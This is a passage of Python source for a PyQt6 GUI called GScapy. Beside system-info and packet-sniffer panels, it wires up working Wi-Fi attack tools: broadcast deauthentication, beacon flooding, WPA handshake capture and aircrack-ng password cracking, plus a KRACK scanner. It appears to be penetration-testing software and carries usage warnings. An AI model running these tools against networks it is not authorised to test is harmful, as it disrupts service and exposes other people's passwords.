        main_layout.setSpacing(20)
        main_layout.setContentsMargins(20, 20, 20, 20)
        scroll_area.setWidget(main_widget)

        # --- Helper for creating styled GroupBoxes ---
        def create_info_box(title):
            box = QGroupBox(title)
            # Basic styling for a modern "card" look
            box.setStyleSheet("""
                QGroupBox {
                    font-size: 14px;
                    font-weight: bold;
                    border: 1px solid #444;
                    border-radius: 8px;
                    margin-top: 10px;
                }
                QGroupBox::title {
                    subcontrol-origin: margin;
                    subcontrol-position: top left;
                    padding: 0 10px;
                }
            """)
            layout = QFormLayout(box)
            layout.setSpacing(10)
            layout.setContentsMargins(15, 25, 15, 15) # Top margin for title
            return box, layout

        # --- Top Row: System, CPU, Memory ---
        top_row_layout = QHBoxLayout()
        top_row_layout.setSpacing(20)

        # System Info Box
        sys_box, sys_layout = create_info_box("System")
        sys_layout.addRow("OS:", QLabel(f"{platform.system()} {platform.release()}"))
        sys_layout.addRow("Architecture:", QLabel(platform.machine()))
        sys_layout.addRow("Hostname:", QLabel(platform.node()))
        sys_layout.addRow("Python Version:", QLabel(platform.python_version()))
        top_row_layout.addWidget(sys_box)

        # CPU Info Box
        cpu_box, cpu_layout = create_info_box("CPU")
        try:
            cpu_freq = psutil.cpu_freq()
            freq_str = f"{cpu_freq.current:.2f} Mhz (Max: {cpu_freq.max:.2f} Mhz)" if cpu_freq else "N/A"
        except Exception:
            freq_str = "N/A (Permission Denied)"
        cpu_layout.addRow("Frequency:", QLabel(freq_str))
        cpu_layout.addRow("Physical Cores:", QLabel(str(psutil.cpu_count(logical=False))))
        cpu_layout.addRow("Logical Cores:", QLabel(str(psutil.cpu_count(logical=True))))
        top_row_layout.addWidget(cpu_box)

        # Memory Info Box
        mem_box, mem_layout = create_info_box("Memory")
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        mem_layout.addRow("Total RAM:", QLabel(f"{mem.total / (1024**3):.2f} GB"))
        mem_layout.addRow("Available RAM:", QLabel(f"{mem.available / (1024**3):.2f} GB"))
        mem_layout.addRow("Swap Total:", QLabel(f"{swap.total / (1024**3):.2f} GB"))
        mem_layout.addRow("Swap Used:", QLabel(f"{swap.used / (1024**3):.2f} GB ({swap.percent}%)"))
        top_row_layout.addWidget(mem_box)

        main_layout.addLayout(top_row_layout)

        # --- Second Row: Libraries and GPU ---
        second_row_layout = QHBoxLayout()
        second_row_layout.setSpacing(20)

        # Library Versions Box
        try:
            scapy_version = scapy.VERSION
        except AttributeError:
            scapy_version = "Unknown"
        lib_box, lib_layout = create_info_box("Library Versions")
        lib_layout.addRow("Scapy:", QLabel(scapy_version))
        lib_layout.addRow("PyQt6:", QLabel(PYQT_VERSION_STR))
        lib_layout.addRow("psutil:", QLabel(psutil.__version__))
        if GPUtil:
            lib_layout.addRow("GPUtil:", QLabel(getattr(GPUtil, '__version__', 'N/A')))
        second_row_layout.addWidget(lib_box)

        # GPU Info Box
        if GPUtil:
            gpu_box, gpu_layout = create_info_box("GPU Information")
            try:
                gpus = GPUtil.getGPUs()
                if not gpus:
                    gpu_layout.addRow(QLabel("No NVIDIA GPU detected."))
                else:
                    for i, gpu in enumerate(gpus):
                        gpu_layout.addRow(f"GPU {i} Name:", QLabel(gpu.name))
                        gpu_layout.addRow("  - Driver:", QLabel(gpu.driver))
                        gpu_layout.addRow("  - Memory:", QLabel(f"{gpu.memoryUsed}MB / {gpu.memoryTotal}MB"))
            except Exception as e:
                gpu_layout.addRow(QLabel(f"Could not retrieve GPU info: {e}"))
            second_row_layout.addWidget(gpu_box)

        second_row_layout.addStretch()
        main_layout.addLayout(second_row_layout)

        # --- Disk Partitions Box ---
        disk_box = QGroupBox("Disk Partitions")
        disk_box.setStyleSheet("""
            QGroupBox {
                font-size: 14px;
                font-weight: bold;
                border: 1px solid #444;
                border-radius: 8px;
                margin-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 0 10px;
            }
        """)
        disk_layout = QGridLayout(disk_box)
        disk_layout.setContentsMargins(15, 25, 15, 15)
        try:
            partitions = psutil.disk_partitions()
            if not partitions:
                disk_layout.addWidget(QLabel("No disk partitions found."), 0, 0)
            else:
                row, col = 0, 0
                for part in partitions:
                    try:
                        usage = psutil.disk_usage(part.mountpoint)
                        part_label = QLabel(f"<b>{part.device}</b> on {part.mountpoint} ({part.fstype})<br>"
                                          f"&nbsp;&nbsp;Total: {usage.total / (1024**3):.2f} GB, "
                                          f"Used: {usage.used / (1024**3):.2f} GB ({usage.percent}%)")
                        disk_layout.addWidget(part_label, row, col)
                        col += 1
                        if col >= 2: # 2 columns
                            col = 0
                            row += 1
                    except Exception:
                        continue # Skip inaccessible drives
        except Exception as e:
            disk_layout.addWidget(QLabel(f"Could not retrieve disk partitions: {e}"), 0, 0)
        main_layout.addWidget(disk_box)


        # --- Network Interfaces Box ---
        net_box = QGroupBox("Network Interfaces")
        net_box.setStyleSheet("""
            QGroupBox {
                font-size: 14px; font-weight: bold; border: 1px solid #444;
                border-radius: 8px; margin-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin; subcontrol-position: top left; padding: 0 10px;
            }
        """)
        net_main_layout = QVBoxLayout(net_box)
        net_main_layout.setContentsMargins(15, 25, 15, 15)

        try:
            ifaddrs = psutil.net_if_addrs()
            if not ifaddrs:
                net_main_layout.addWidget(QLabel("No network interfaces found."))
            else:
                for iface, addrs in sorted(ifaddrs.items()):
                    # Skip loopback interfaces unless they have a non-standard address
                    is_loopback = 'loopback' in iface.lower() or iface.startswith('lo')
                    if is_loopback and all(addr.address in ['127.0.0.1', '::1'] for addr in addrs):
                        continue

                    iface_box = QGroupBox(iface)
                    iface_box.setStyleSheet("QGroupBox { border: 1px solid #555; margin-top: 5px; }")
                    iface_layout = QFormLayout(iface_box)

                    addr_map = {'ipv4': [], 'ipv6': [], 'mac': 'N/A'}
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            addr_map['ipv4'].append(addr.address)
                        elif addr.family == socket.AF_INET6:
                            # Filter out link-local addresses for cleaner display
                            if not addr.address.startswith('fe80::'):
                                addr_map['ipv6'].append(addr.address)
                        # This logic correctly handles cross-platform MAC address retrieval
                        elif hasattr(psutil, 'AF_LINK') and addr.family == psutil.AF_LINK:
                            addr_map['mac'] = addr.address
                        elif hasattr(socket, 'AF_PACKET') and addr.family == socket.AF_PACKET:
                             addr_map['mac'] = addr.address

                    # Join multiple IPs, or display N/A if none were found
                    ipv4_str = ", ".join(addr_map['ipv4']) or "N/A"
                    ipv6_str = ", ".join(addr_map['ipv6']) or "N/A"

                    iface_layout.addRow(QLabel("<b>IPv4 Address:</b>"), QLabel(ipv4_str))
                    iface_layout.addRow(QLabel("<b>IPv6 Address:</b>"), QLabel(ipv6_str))
                    iface_layout.addRow(QLabel("<b>MAC Address:</b>"), QLabel(addr_map['mac']))

                    net_main_layout.addWidget(iface_box)
        except Exception as e:
            logging.error(f"Could not retrieve network interfaces: {e}", exc_info=True)
            net_main_layout.addWidget(QLabel(f"Could not retrieve interfaces: {e}"))

        main_layout.addWidget(net_box)

        main_layout.addStretch() # Push everything to the top
        return scroll_area

    def _create_wireless_tools_tab(self, p=None):
        """Creates the tab container for 802.11 wireless tools."""
        wireless_tabs = QTabWidget()
        wireless_tabs.addTab(self._create_wifi_scanner_tool(), "Wi-Fi Scanner")
        wireless_tabs.addTab(self._create_deauth_tool(), "Deauthentication Tool")
        wireless_tabs.addTab(self._create_beacon_flood_tool(), "Beacon Flood")
        wireless_tabs.addTab(self._create_wpa_crack_tool(), "WPA Handshake Tool")
        wireless_tabs.addTab(self._create_krack_scanner_tool(), "KRACK Scanner")
        return wireless_tabs

    def _create_krack_scanner_tool(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        instructions = QTextEdit()
        instructions.setReadOnly(True)
        instructions.setHtml("""
        <font color='#ffcc00'><b>KRACK Vulnerability Scanner</b></font>
        <p>This tool passively detects networks vulnerable to Key Reinstallation Attacks (KRACK). It works by listening for retransmitted EAPOL Message 3 packets during a 4-way handshake.</p>
        <p><b>Usage:</b></p>
        <ol>
            <li>Ensure your wireless card is in <b>Monitor Mode</b> and select it at the top.</li>
            <li>Click "Start Scan". The tool will listen indefinitely.</li>
            <li>To trigger a handshake, you can use the Deauthentication Tool to briefly disconnect a client, forcing it to reconnect.</li>
            <li>Any vulnerable networks detected will appear in the results table below.</li>
        </ol>
        """)
        layout.addWidget(instructions)

        controls = QHBoxLayout()
        self.krack_start_btn = QPushButton("Start Scan")
        self.krack_stop_btn = QPushButton("Stop Scan"); self.krack_stop_btn.setEnabled(False)
        controls.addWidget(self.krack_start_btn)
        controls.addWidget(self.krack_stop_btn)
        layout.addLayout(controls)

        self.krack_results_tree = QTreeWidget()
        self.krack_results_tree.setColumnCount(3)
        self.krack_results_tree.setHeaderLabels(["BSSID (AP)", "Client MAC", "Time Detected"])
        layout.addWidget(self.krack_results_tree)

        self.krack_start_btn.clicked.connect(self.start_krack_scan)
        self.krack_stop_btn.clicked.connect(self.stop_krack_scan)

        return widget


    def _create_wifi_scanner_tool(self):
        widget = QWidget(); layout = QVBoxLayout(widget)
        instructions = QTextEdit()
        instructions.setReadOnly(True)
        instructions.setStyleSheet("background-color: #3c3c3c; color: #f0f0f0; border: 1px solid #555;")
        instructions.setHtml("""
        <font color='#ffcc00'><b>WARNING:</b> Wireless tools require the selected interface to be in <b>Monitor Mode</b>.</font>
        <p>GScapy cannot enable this mode for you. You must do it manually before scanning.</p>
        <p><b>Example for Linux (using airmon-ng):</b></p>
        <ol>
            <li>Find your interface: <code>iwconfig</code> (e.g., wlan0)</li>
            <li>Start monitor mode: <code>sudo airmon-ng start wlan0</code></li>
            <li>A new interface (e.g., wlan0mon) will be created.</li>
            <li><b>Select the new monitor interface (e.g., wlan0mon) from the dropdown at the top of the GScapy window.</b></li>
        </ol>
        """)
        layout.addWidget(instructions)
        controls = QHBoxLayout()
        self.wifi_scan_button = QPushButton("Scan for Wi-Fi Networks")
        self.wifi_scan_button.setToolTip("Scans for nearby Wi-Fi networks.\nThe selected interface must be in monitor mode.")
        controls.addWidget(self.wifi_scan_button)
        self.wifi_scan_stop_button = QPushButton("Stop Scan")
        self.wifi_scan_stop_button.setToolTip("Stops the current Wi-Fi scan.")
        self.wifi_scan_stop_button.setEnabled(False)
        controls.addWidget(self.wifi_scan_stop_button)
        self.wifi_scan_status = QLabel(""); controls.addWidget(self.wifi_scan_status); controls.addStretch()
        layout.addLayout(controls)
        self.wifi_tree = QTreeWidget(); self.wifi_tree.setColumnCount(4); self.wifi_tree.setHeaderLabels(["SSID", "BSSID", "Channel", "Signal"])
        layout.addWidget(self.wifi_tree)
        layout.addWidget(self._create_export_button(self.wifi_tree))
        self.wifi_scan_button.clicked.connect(self.start_wifi_scan)
        self.wifi_scan_stop_button.clicked.connect(self.stop_wifi_scan)
        return widget

    def _create_wpa_crack_tool(self):
        """Creates the UI for the WPA Handshake and Cracking tool."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # --- Handshake Capture Section ---
        capture_box = QGroupBox("WPA Handshake Capture")
        capture_layout = QVBoxLayout(capture_box)

        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target BSSID:"))
        self.wpa_target_combo = QComboBox(); self.wpa_target_combo.setToolTip("Select a target network from the list discovered by the Wi-Fi Scanner.")
        target_layout.addWidget(self.wpa_target_combo)
        refresh_btn = QPushButton("Refresh List"); refresh_btn.setToolTip("Update the list of targets from the Wi-Fi Scanner tab.")
        refresh_btn.clicked.connect(self._refresh_wpa_targets)
        target_layout.addWidget(refresh_btn)
        capture_layout.addLayout(target_layout)

        capture_controls = QHBoxLayout()
        self.wpa_capture_btn = QPushButton("Start Handshake Capture"); self.wpa_capture_btn.setToolTip("Begin sniffing for a WPA handshake from the selected target.")
        capture_controls.addWidget(self.wpa_capture_btn)
        self.wpa_deauth_client_btn = QPushButton("Deauth Client to Speed Up"); self.wpa_deauth_client_btn.setToolTip("Send deauthentication packets to the network to encourage a client to reconnect, speeding up handshake capture.")
        capture_controls.addWidget(self.wpa_deauth_client_btn)
        capture_layout.addLayout(capture_controls)

        self.wpa_capture_status = QLabel("Status: Idle")
        capture_layout.addWidget(self.wpa_capture_status)
        layout.addWidget(capture_box)

        # --- Hash Cracker Section ---
        cracker_box = QGroupBox("WPA Hash Cracker")
        cracker_layout = QVBoxLayout(cracker_box)

        pcap_layout = QHBoxLayout()
        pcap_layout.addWidget(QLabel("Handshake File (.pcap):"))
        self.wpa_pcap_edit = QLineEdit(); self.wpa_pcap_edit.setPlaceholderText("Path to .pcap file containing the handshake...")
        self.wpa_pcap_edit.setToolTip("The .pcap file containing the captured WPA handshake.")
        pcap_layout.addWidget(self.wpa_pcap_edit)
        pcap_browse_btn = QPushButton("Browse...")
        pcap_browse_btn.setToolTip("Browse for a .pcap file containing a WPA handshake.")
        pcap_browse_btn.clicked.connect(self.browse_for_pcap)
        pcap_layout.addWidget(pcap_browse_btn)
        cracker_layout.addLayout(pcap_layout)

        wordlist_layout = QHBoxLayout()
        wordlist_layout.addWidget(QLabel("Wordlist File:"))
        self.wpa_wordlist_edit = QLineEdit(); self.wpa_wordlist_edit.setPlaceholderText("Path to wordlist file (or leave blank for default)...")
        self.wpa_wordlist_edit.setToolTip("The wordlist file to use for the dictionary attack. If left blank, a small internal list will be used.")
        wordlist_layout.addWidget(self.wpa_wordlist_edit)
        wordlist_browse_btn = QPushButton("Browse...")
        wordlist_browse_btn.setToolTip("Browse for a wordlist file (.txt).")
        wordlist_browse_btn.clicked.connect(self.browse_for_wordlist)
        wordlist_layout.addWidget(wordlist_browse_btn)
        crunch_btn = QPushButton("Generate...")
        crunch_btn.setToolTip("Generate a custom wordlist using Crunch (must be installed).")
        crunch_btn.clicked.connect(self.open_crunch_generator)
        wordlist_layout.addWidget(crunch_btn)
        cracker_layout.addLayout(wordlist_layout)

        cpu_layout = QHBoxLayout()
        cpu_layout.addWidget(QLabel("CPU Threads:"))
        self.wpa_threads_edit = QLineEdit("1"); self.wpa_threads_edit.setToolTip("Number of CPU threads for aircrack-ng to use.")
        cpu_layout.addWidget(self.wpa_threads_edit)
        cpu_layout.addStretch()
        cracker_layout.addLayout(cpu_layout)

        self.wpa_crack_btn = QPushButton("Start Cracking"); self.wpa_crack_btn.setToolTip("Begin the cracking process using aircrack-ng.")
        cracker_layout.addWidget(self.wpa_crack_btn)

        self.wpa_crack_output = QPlainTextEdit(); self.wpa_crack_output.setReadOnly(True)
        self.wpa_crack_output.setPlaceholderText("Aircrack-ng output will be shown here...")
        cracker_layout.addWidget(self.wpa_crack_output)
        layout.addWidget(cracker_box)

        self.wpa_capture_btn.clicked.connect(self.start_handshake_capture)
        self.wpa_deauth_client_btn.clicked.connect(self.deauth_for_handshake)
        self.wpa_crack_btn.clicked.connect(self.start_wpa_crack)

        return widget

    def _refresh_wpa_targets(self):
        self.wpa_target_combo.clear()
        if not self.found_networks:
            QMessageBox.information(self, "No Networks", "No networks found. Please run the Wi-Fi Scanner first.")
            return
        for bssid, info in self.found_networks.items():
            ssid = info[0]
            self.wpa_target_combo.addItem(f"{ssid} ({bssid})", bssid)

    def browse_for_pcap(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Handshake File", "", "Pcap Files (*.pcap *.pcapng);;All Files (*)")
        if file_path:
            self.wpa_pcap_edit.setText(file_path)

    def browse_for_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.wpa_wordlist_edit.setText(file_path)

    def start_wpa_crack(self):
        if self.aircrack_thread and self.aircrack_thread.isRunning():
            self.aircrack_thread.stop()
            return

        pcap_file = self.wpa_pcap_edit.text()
        wordlist = self.wpa_wordlist_edit.text()
        try:
            threads = int(self.wpa_threads_edit.text())
        except ValueError:
            QMessageBox.warning(self, "Input Error", "CPU threads must be a valid number.")
            return

        if not pcap_file:
            QMessageBox.warning(self, "Input Error", "Please provide a handshake file.")
            return
        if not os.path.exists(pcap_file):
            QMessageBox.warning(self, "File Error", f"Pcap file not found:\n{pcap_file}")
            return

        if not wordlist:
            wordlist = "default_pass.txt"

        if not os.path.exists(wordlist):
            QMessageBox.warning(self, "File Error", f"Wordlist file not found:\n{wordlist}")
            return

        self.wpa_crack_output.clear()
        self.wpa_crack_btn.setText("Stop Cracking")
        self.aircrack_thread = AircrackThread(pcap_file, wordlist, self, threads)
        self.aircrack_thread.output_received.connect(self._process_aircrack_output)
        self.aircrack_thread.finished_signal.connect(self._on_aircrack_finished)
        self.aircrack_thread.start()

    def _process_aircrack_output(self, line):
        self.wpa_crack_output.appendPlainText(line)
        if "KEY FOUND!" in line:
            self.wpa_crack_output.appendPlainText("\n\n---> PASSWORD FOUND! <---")
            self.aircrack_thread.stop()

    def _on_aircrack_finished(self, return_code):
        self.wpa_crack_btn.setText("Start Cracking")
        self.wpa_crack_output.appendPlainText(f"\n--- Process finished with exit code {return_code} ---")

    def open_crunch_generator(self):
        dialog = CrunchDialog(self)
        if dialog.exec():
            values = dialog.get_values()
            min_len, max_len, charset, outfile = values["min"], values["max"], values["charset"], values["outfile"]

            if not all([min_len, max_len, charset, outfile]):
                QMessageBox.warning(self, "Input Error", "All fields are required to generate a wordlist.")
                return

            command = ["crunch", min_len, max_len, charset, "-o", outfile]

            try:
                self.wpa_crack_output.appendPlainText(f"Starting crunch: {' '.join(command)}")

                def run_crunch():
                    try:
                        # Use CREATE_NO_WINDOW flag on Windows to hide the console
                        startupinfo = None
                        if sys.platform == "win32":
                            startupinfo = subprocess.STARTUPINFO()
                            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, startupinfo=startupinfo)
                        for line in iter(process.stdout.readline, ''):
                            logging.info(f"[crunch] {line.strip()}")
                        process.wait()
                        self.tool_results_queue.put(('crunch_finished', outfile, process.returncode))
                    except FileNotFoundError:
                        self.tool_results_queue.put(('error', 'Crunch Error', "'crunch' command not found. Please ensure it is installed and in your system's PATH."))
                    except Exception as e:
                        self.tool_results_queue.put(('error', 'Crunch Error', str(e)))

                self.worker = WorkerThread(target=run_crunch)
                self.worker.start()

            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to start crunch: {e}")

    def start_handshake_capture(self):
        if self.is_tool_running:
            self.stop_handshake_capture()
            return

        iface = self.get_selected_iface()
        if not iface:
            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode interface.")
            return

        bssid = self.wpa_target_combo.currentData()
        if not bssid:
            QMessageBox.warning(self, "Target Error", "Please select a target network.")
            return

        self.is_tool_running = True
        self.wpa_capture_btn.setText("Stop Capture")
        self.handshake_sniffer_thread = HandshakeSnifferThread(iface, bssid)
        self.handshake_sniffer_thread.log_message.connect(lambda msg: self.wpa_capture_status.setText(f"Status: {msg}"))
        self.handshake_sniffer_thread.handshake_captured.connect(self._on_handshake_captured)
        self.handshake_sniffer_thread.start()

    def stop_handshake_capture(self):
        if self.handshake_sniffer_thread and self.handshake_sniffer_thread.isRunning():
            self.handshake_sniffer_thread.stop()
            self.handshake_sniffer_thread.wait()
        self.is_tool_running = False
        self.wpa_capture_btn.setText("Start Handshake Capture")
        self.wpa_capture_status.setText("Status: Idle")

    def _on_handshake_captured(self, bssid, file_path):
        self.wpa_capture_status.setText(f"Status: Handshake for {bssid} captured and saved to {file_path}!")
        self.stop_handshake_capture()
        QMessageBox.information(self, "Success", f"Handshake captured and saved to {file_path}")
        self.wpa_pcap_edit.setText(file_path)

    def deauth_for_handshake(self):
        bssid = self.wpa_target_combo.currentData()
        if not bssid:
            QMessageBox.warning(self, "Target Error", "Please select a target network to deauthenticate.")
            return
        args = (bssid, "ff:ff:ff:ff:ff:ff", 5)
        self.worker = WorkerThread(self._deauth_thread, args=args)
        self.worker.start()
        QMessageBox.information(self, "Deauth Sent", f"Sent 5 deauth packets to the network {bssid} to encourage re-association.")

    def _create_deauth_tool(self):
        widget = QWidget(); layout = QVBoxLayout(widget)
        warning_label = QLabel("WARNING: Sending deauthentication packets can disrupt networks you do not own. Use responsibly and only on your own network for testing purposes.")
        warning_label.setStyleSheet("color: #ffcc00;")
        layout.addWidget(warning_label)
        controls = QFrame(); clayout = QVBoxLayout(controls)
        row1 = QHBoxLayout()
        row1.addWidget(QLabel("AP BSSID (MAC):"))
        self.deauth_bssid = QLineEdit("ff:ff:ff:ff:ff:ff")
        self.deauth_bssid.setToolTip("The MAC address (BSSID) of the target Access Point.")
        row1.addWidget(self.deauth_bssid)
        clayout.addLayout(row1)
        row2 = QHBoxLayout()
        row2.addWidget(QLabel("Client MAC:"))
        self.deauth_client = QLineEdit("ff:ff:ff:ff:ff:ff")
        self.deauth_client.setToolTip("The MAC address of the client to deauthenticate.\nUse 'ff:ff:ff:ff:ff:ff' to deauthenticate all clients.")
        row2.addWidget(self.deauth_client)
        clayout.addLayout(row2)
        row3 = QHBoxLayout()
        row3.addWidget(QLabel("Count:"))
        self.deauth_count = QLineEdit("10")
        self.deauth_count.setToolTip("The number of deauthentication packets to send.")
        row3.addWidget(self.deauth_count)
        clayout.addLayout(row3)
        self.deauth_button = QPushButton("Send Deauth Packets")
        self.deauth_button.setToolTip("Start sending deauthentication packets.\nWARNING: This will disrupt the target's connection.")
        clayout.addWidget(self.deauth_button)
        self.deauth_status = QLabel(""); clayout.addWidget(self.deauth_status)
        layout.addWidget(controls)
        self.deauth_button.clicked.connect(self.start_deauth)
        return widget

    def _create_beacon_flood_tool(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)

        warning_label = QLabel("WARNING: Flooding the air with beacon frames can disrupt Wi-Fi networks in the area. Use this tool responsibly and only for legitimate testing purposes.")
        warning_label.setStyleSheet("color: #ffcc00;")
        warning_label.setWordWrap(True)
        layout.addWidget(warning_label)

        controls = QFrame()
        controls.setFrameShape(QFrame.Shape.StyledPanel)
        clayout = QFormLayout(controls)

        # SSID controls
        ssid_layout = QHBoxLayout()
        self.bf_ssid_edit = QLineEdit("TestNet")
        self.bf_ssid_edit.setToolTip("A single SSID, or load multiple from a file.")
        ssid_layout.addWidget(self.bf_ssid_edit)
        self.bf_ssid_from_file_btn = QPushButton("Load from File")
        self.bf_ssid_from_file_btn.setToolTip("Load a list of SSIDs from a .txt file (one per line).")
        ssid_layout.addWidget(self.bf_ssid_from_file_btn)
        clayout.addRow("SSID(s):", ssid_layout)

        self.bf_bssid_edit = QLineEdit("random")
        self.bf_bssid_edit.setToolTip("The BSSID (MAC address) of the fake AP. 'random' will generate a new MAC for each packet.")
        clayout.addRow("BSSID:", self.bf_bssid_edit)

        # Encryption
        self.bf_enc_combo = QComboBox()
        self.bf_enc_combo.addItems(["Open", "WEP", "WPA2-PSK", "WPA3-SAE"])
        self.bf_enc_combo.setToolTip("Select the advertised encryption type for the fake network(s).")
        clayout.addRow("Encryption:", self.bf_enc_combo)

        # Channel
        self.bf_channel_edit = QLineEdit("1")
        self.bf_channel_edit.setToolTip("The 802.11 channel to broadcast the beacons on.")
        clayout.addRow("Channel:", self.bf_channel_edit)

        self.bf_count_edit = QLineEdit("1000")
        self.bf_count_edit.setToolTip("The number of beacon frames to send. Use '0' for an infinite flood.")
        clayout.addRow("Count:", self.bf_count_edit)

        self.bf_interval_edit = QLineEdit("0.1")
        self.bf_interval_edit.setToolTip("The time interval (in seconds) between sending each beacon frame.")
        clayout.addRow("Interval:", self.bf_interval_edit)

        layout.addWidget(controls)

        buttons_layout = QHBoxLayout()
        self.bf_start_button = QPushButton("Start Beacon Flood")
        self.bf_start_button.setToolTip("Begin sending fake beacon frames.")
        buttons_layout.addWidget(self.bf_start_button)

        self.bf_stop_button = QPushButton("Stop Flood")
        self.bf_stop_button.setEnabled(False)
        self.bf_stop_button.setToolTip("Stop the ongoing beacon flood.")
        buttons_layout.addWidget(self.bf_stop_button)
        layout.addLayout(buttons_layout)

        self.bf_status_label = QLabel("Status: Idle")
        layout.addWidget(self.bf_status_label)
        layout.addStretch()

        self.bf_start_button.clicked.connect(self.start_beacon_flood)
        self.bf_stop_button.clicked.connect(self.cancel_tool)
        self.bf_ssid_from_file_btn.clicked.connect(self.load_ssids_for_beacon_flood)

        return widget

    def load_ssids_for_beacon_flood(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select SSID List File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.bf_ssid_list = [line.strip() for line in f if line.strip()]
                if self.bf_ssid_list:
                    self.bf_ssid_edit.setText(f"Loaded {len(self.bf_ssid_list)} SSIDs from file")
                    self.bf_ssid_edit.setReadOnly(True)
                    logging.info(f"Loaded {len(self.bf_ssid_list)} SSIDs for beacon flood.")
                else:
                    self.bf_ssid_edit.setText("")
                    self.bf_ssid_edit.setReadOnly(False)
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load SSID file: {e}")


    # --- Backend Methods: Sniffer ---
    def start_sniffing(self):
        """Starts the packet sniffer thread."""
        self.start_sniff_btn.setEnabled(False)
        self.stop_sniff_btn.setEnabled(True)
        self.clear_sniffer_display()
        iface = self.get_selected_iface()
        bpf_filter = self.filter_input.text()
        # Create the thread manager
        self.sniffer_thread = SnifferThread(iface=iface, bpf_filter=bpf_filter, parent=self)
        # Connect the new thread-safe signal to the reconstruction slot
        self.sniffer_thread.packet_bytes_received.connect(self._handle_packet_bytes)
        self.sniffer_thread.finished.connect(self._on_sniffer_finished)
        self.sniffer_thread.start()
        self.status_bar.showMessage(f"Sniffing on interface: {iface or 'default'}...")

    def _handle_packet_bytes(self, pkt_bytes):
        """Reconstructs a packet from bytes and adds it to a buffer for batch updating."""
        try:
            # Reconstruction is quick, so it's safe to do here.
            packet = Ether(pkt_bytes)
            with self.sniffer_buffer_lock:
                self.sniffer_packet_buffer.append(packet)
        except Exception as e:
            logging.error(f"Failed to reconstruct or buffer packet: {e}")

    def stop_sniffing(self):
        """Signals the packet sniffer thread to stop."""
        if self.sniffer_thread and self.sniffer_thread.isRunning():
            self.stop_sniff_btn.setEnabled(False) # Prevent multiple clicks
            self.status_bar.showMessage("Stopping sniffer...")
            self.sniffer_thread.stop()

    def _on_sniffer_finished(self):
        """Handles cleanup after the sniffer thread has terminated."""
        self.start_sniff_btn.setEnabled(True)
        # The stop button is already disabled in stop_sniffing, but let's ensure it here too
        self.stop_sniff_btn.setEnabled(False)
        self.status_bar.showMessage("Sniffing stopped.")
        self.sniffer_thread = None # Clear the reference to the finished thread

    def _update_sniffer_display(self):
        """Periodically called by a timer to batch-update the sniffer GUI."""
        with self.sniffer_buffer_lock:
            if not self.sniffer_packet_buffer:
                return
            # Quickly swap the buffer and release the lock
            packets_to_add = self.sniffer_packet_buffer
            self.sniffer_packet_buffer = []

        # Now process the packets without holding the lock
        items_to_add = []
        for packet in packets_to_add:
            self.packets_data.append(packet)
            n = len(self.packets_data)
            try:
                pt = f"{time.strftime('%H:%M:%S', time.localtime(packet.time))}.{int(packet.time * 1000) % 1000}"
                src = packet[IP].src if packet.haslayer(IP) else (packet[ARP].psrc if packet.haslayer(ARP) else "N/A")
                dst = packet[IP].dst if packet.haslayer(IP) else (packet[ARP].pdst if packet.haslayer(ARP) else "N/A")
                proto = packet.summary().split('/')[1].strip() if '/' in packet.summary() else "N/A"
                length = len(packet)
                item_data = [str(n), pt, src, dst, proto, str(length)]
            except Exception:
                item_data = [str(n), "Parse Error", "N/A", "N/A", "N/A", "N/A"]

            items_to_add.append(QTreeWidgetItem(item_data))

        self.packet_list_widget.addTopLevelItems(items_to_add)
        self.packet_list_widget.scrollToBottom()


    def add_packet_to_list(self, packet):
        """Callback function to add a sniffed packet to the UI list."""
        self.packets_data.append(packet); n = len(self.packets_data)
        try:
            pt = f"{time.strftime('%H:%M:%S', time.localtime(packet.time))}.{int(packet.time * 1000) % 1000}"
            src = packet[IP].src if packet.haslayer(IP) else (packet[ARP].psrc if packet.haslayer(ARP) else "N/A")
            dst = packet[IP].dst if packet.haslayer(IP) else (packet[ARP].pdst if packet.haslayer(ARP) else "N/A")
            proto = packet.summary().split('/')[1].strip() if '/' in packet.summary() else "N/A"
            length = len(packet)
        except Exception: pt, src, dst, proto, length = "Parse Error", "N/A", "N/A", "N/A", "N/A"
        item = QTreeWidgetItem([str(n), pt, src, dst, proto, str(length)]); self.packet_list_widget.addTopLevelItem(item); self.packet_list_widget.scrollToBottom()

    def display_packet_details(self, current_item, previous_item):
        """Displays the selected packet's details in the tree and hex views."""
        self.packet_details_tree.clear()
        self.packet_hex_view.clear()

        if not current_item:
            return

        try:
            packet_index = int(current_item.text(0)) - 1
            if not (0 <= packet_index < len(self.packets_data)):
                return

            packet = self.packets_data[packet_index]

            # Populate the hex view
            hex_dump = hexdump(packet, dump=True)
            self.packet_hex_view.setText(hex_dump)

            # Populate the details tree
            # We need to keep track of layer names to avoid duplicates from scapy's perspective
            layer_counts = {}
            current_layer = packet
            while current_layer:
                layer_name_raw = current_layer.name
                if layer_name_raw in layer_counts:
                    layer_counts[layer_name_raw] += 1
                    layer_name = f"{layer_name_raw} #{layer_counts[layer_name_raw]}"
                else:
                    layer_counts[layer_name_raw] = 1
                    layer_name = layer_name_raw

                layer_item = QTreeWidgetItem([layer_name])
                self.packet_details_tree.addTopLevelItem(layer_item)

                for field in current_layer.fields_desc:
                    field_name = field.name
                    try:
                        val = current_layer.getfieldval(field_name)
                        # i2repr is the standard Scapy way to get a display-friendly representation
                        display_value = field.i2repr(current_layer, val)
                    except Exception as e:
                        # Log the actual error for debugging, but still show a user-friendly message
                        logging.warning(f"Could not display field '{field_name}': {e}")
                        display_value = "Error reading value"

